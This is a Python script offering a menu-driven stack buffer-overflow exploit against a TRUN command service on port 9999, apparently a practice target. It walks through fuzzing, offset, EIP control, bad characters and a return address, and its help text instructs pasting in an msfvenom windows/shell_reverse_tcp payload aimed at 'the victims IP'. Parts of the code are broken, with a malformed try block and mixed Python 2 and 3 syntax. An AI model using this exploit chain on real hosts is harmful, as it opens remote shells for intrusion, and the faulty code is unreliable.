#!/bin/python
# -*- coding: utf-8 -*- 

from tqdm import tqdm
import sys
import socket 

loop = tqdm(total = 50000, position=0, leave=False)
for k in range(50000):
	loop.set_description("Loading..." .format(k))
	loop.update(1)
loop.close()

print(''' 
░█████╗░██╗░░░░░██╗░░░░░  ██╗███╗░░██╗  ░░███╗░░
██╔══██╗██║░░░░░██║░░░░░  ██║████╗░██║  ░████║░░
███████║██║░░░░░██║░░░░░  ██║██╔██╗██║  ██╔██║░░
██╔══██║██║░░░░░██║░░░░░  ██║██║╚████║  ╚═╝██║░░
██║░░██║███████╗███████╗  ██║██║░╚███║  ███████╗
╚═╝░░╚═╝╚══════╝╚══════╝  ╚═╝╚═╝░░╚══╝  ╚══════╝''')

print("-" * 50)
print("1. FUZZING")
print("2. OFFSET")
print("3. EIP")
print("4. BAD CHARS")
print("5. FIND RIGHT MODULE")
print("6. ROOT")
print("7. Help")
options=int (input ("Enter Number: "))  
print("-" * 50)

if options == 1 :

	buffer = "A" * 10000

	while True:                  

		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(('',9999))

			s.send(('TRUN /.:/' + buffer)) 
			s.close()

		except:
			print "Fuzzing crashed at %s bytes" % str(len(buffer))
			sys.exit()

if options == 2 :
	offset=""
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('',9999))
		s.send(('TRUN /.:/' + offset)) 
		s.close()

	except:
		print "error connecting to server"
		sys.exit()

if options == 3 :
	
	shellcode = "A"*515 + "B"*4 + "C"*(1400-515-4)

	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('',9999))
		s.send(('TRUN /.:/' + shellcode)) 
		s.close()

	except:
		print ('error connecting to server')
		sys.exit()

if options == 4 :
	
	badchars = ("")

	shellcode = "A" * 515 + "B" * 4 + badchars
	
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('',9999))

		s.send(('TRUN /.:/' + shellcode)) 
		s.close()

	except:
		print ('error connecting to server')
		sys.exit()

if options == 5 :

	shellcode = "A" * 515 + "\xF3\x12\x17\x31" + "C"*(1400-515-4)

	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('',9999))

		s.send(('TRUN /.:/' + shellcode)) 
		s.close()

	except:
		print ('error connecting to server')
		sys.exit()

if options == 6 :

	buf=("")


	shellcode = 'A'*515 + "\xf3\x12\x17\x31" + '\x90'*16 + buf

	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('',9999))
		s.send(('TRUN /.:/' + shellcode)) 
		s.close()

	except:
		print ('error connecting to server')
		sys.exit()

if options == 7 : 

	print("In all the lines of code called s.connect(('IP', Port)) plz enter the victims IP and port")	
	print("For offset go to this directory ./pattern_create.rb -l 2000 and type this command ./pattern_create.rb -l (Enter any number)")	
	print("affter you get the results copy and paste the gibberish in the code, offset='Enter it here' after that type this command with")
	print("the same directory type this command ./pattern_offset.rb -l (any number) -q (the number result of the offset), the you have to")
	print("find the bad chars, to do this google bad chars and find the correct list and paste it in this code line badchars=('place here')")
	print("with the results of the bad chars you have to find the right module and finaly to get root type a command in msfvenom")
	print("(this is an example: msfvenom -p windows/shell_reverse_tcp LHOST=(IP)LPORT=(port)AppendExit=true -f c -a x86 -b 'x00'")
	print("then copy and paste the shellcode given in this line buf=('') and run the code")
  print("and in this part of the code shellcode = 'A' * 515 + where it says xf3 x12 and the others, that changes depending on the modules")
